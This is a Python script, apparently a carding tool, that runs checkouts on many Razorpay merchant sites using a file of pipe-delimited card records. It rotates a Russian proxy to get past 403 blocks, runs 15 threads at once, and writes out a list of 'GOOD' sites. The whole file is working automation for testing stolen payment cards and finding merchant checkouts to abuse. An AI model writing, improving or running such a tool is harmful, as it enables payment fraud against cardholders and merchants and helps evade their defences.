#!/usr/bin/env python3
"""Razorpay site validator — RU rotating proxy, 403 retries same site (fresh IP), 15 concurrent."""
import os, sys, json, time, argparse, itertools, threading, concurrent.futures

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from site_check import run_checkout, classify, _site_key

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sites", required=True)
    ap.add_argument("--proxy", required=True)
    ap.add_argument("--cc-file", required=True)
    ap.add_argument("--out", default="/tmp/rz_sitecheck_ru")
    ap.add_argument("--concurrency", type=int, default=15)
    ap.add_argument("--max-403", type=int, default=3)
    ap.add_argument("--limit", type=int, default=0, help="0 = all sites")
    a = ap.parse_args()

    with open(a.sites) as f:
        sites = [l.strip() for l in f if l.strip().startswith('http')]
    with open(a.cc_file) as f:
        cards = [l.strip() for l in f if l.strip() and '|' in l]
    if a.limit:
        sites = sites[:a.limit]
    card_ctr = itertools.count()
    def next_card():
        return cards[next(card_ctr) % len(cards)]

    os.makedirs(a.out, exist_ok=True)
    done = 0
    lock = threading.Lock()
    progress_f = open(os.path.join(a.out, "progress.log"), "a", buffering=1)

    def work(site):
        key = _site_key(site)
        jf = os.path.join(a.out, f"{key}.json")
        if os.path.exists(jf):
            try:
                prev = json.load(open(jf))
                if prev.get("verdict") in ("GOOD", "SKIP"):
                    return None  # already validated
            except Exception:
                pass
        cc = next_card()
        last = None
        n403 = 0
        for attempt in range(a.max_403 + 1):
            log = []
            t0 = time.time()
            try:
                result = run_checkout(site, cc, a.proxy, log)
            except Exception as e:
                result = {"status": "error", "message": str(e)[:300], "reason": "exception"}
            last = result
            is403 = ("403" in str(result.get("reason", "")).lower()
                     or "403" in str(result.get("message", "")).lower()
                     or "forbidden" in str(result.get("message", "")).lower())
            if is403 and attempt < a.max_403:
                n403 += 1
                time.sleep(0.6)  # rotating proxy -> fresh IP on next request
                continue
            break
        verdict, why = classify(last)
        entry = {"site": site, "verdict": verdict, "why": why, "proxy": a.proxy, "cc": cc,
                 "result": last, "403_retries": n403,
                 "duration_s": round(time.time() - t0, 2)}
        with open(jf, "w") as fh:
            json.dump(entry, fh, indent=2)
        return entry

    def run_pass(sites, tag):
        nonlocal done
        with concurrent.futures.ThreadPoolExecutor(max_workers=a.concurrency) as ex:
            for entry in ex.map(work, sites):
                if entry is None:
                    continue
                done += 1
                line = f"[{tag}] {entry['verdict']:8s} {entry['why'][:38]:38s} 403x{entry['403_retries']} {entry['site']}"
                progress_f.write(line + "\n")
                with lock:
                    pass
                print(line, flush=True)
                if entry["verdict"] == "GOOD":
                    good.append(entry["site"])
                elif entry["verdict"] == "RECHECK":
                    recheck.append(entry["site"])
                else:
                    skipped.append(entry["site"])

    good, skipped, recheck = [], [], []
    print(f"== RU site check: {len(sites)} sites, {len(cards)} cards, {a.concurrency} concurrent, proxy {a.proxy.split('@')[-1]} ==", flush=True)
    run_pass(sites, "pass1")

    if recheck:
        print(f"== SERVER_ERROR {len(recheck)} -> recheck after 120s ==", flush=True)
        time.sleep(120)
        retry = list(recheck); recheck.clear()
        run_pass(retry, "recheck")

    with open(os.path.join(a.out, "good_sites.txt"), "w") as f:
        f.write("\n".join(good) + ("\n" if good else ""))
    summary = {"total": len(sites), "good": len(good), "skipped": len(skipped),
               "still_server_error": len(recheck), "good_sites": good}
    with open(os.path.join(a.out, "summary.json"), "w") as f:
        json.dump(summary, f, indent=2)
    print(f"== DONE == good={len(good)} skipped={len(skipped)} server_error={len(recheck)} -> {a.out}", flush=True)
    progress_f.close()

if __name__ == "__main__":
    main()
